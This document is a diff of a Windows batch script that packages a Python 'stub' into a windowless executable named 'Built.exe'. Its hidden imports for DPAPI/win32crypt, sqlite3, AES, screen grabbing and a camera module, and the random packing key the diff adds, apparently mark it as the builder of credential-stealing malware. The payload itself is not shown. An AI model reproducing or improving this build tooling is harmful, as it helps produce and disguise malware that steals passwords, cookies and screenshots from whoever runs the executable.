@@ -27,12 +27,16 @@ if exist icon.ico (
 ) else (
     set icon=NONE
 )
-pyinstaller --onefile --clean --noconsole --noconfirm stub-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --add-data Camera;. --version-file version.txt %bound%
-if exist dist\Built.exe (
+
+set key=%random%%random%%random%%random%
+set key=%key:~-16%
+pyinstaller --onefile --noconsole --clean --noconfirm stub-o.py --key %key% --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import DPAPI --hidden-import json --add-data Camera;. --version-file version.txt %bound%
+if %errorlevel%==0 (
+    python postprocess.py
     explorer.exe dist
     exit
 ) else (
-    echo Building failed!
-    pause
+    color 4 && title ERROR
+    pause > NUL
     exit
 )
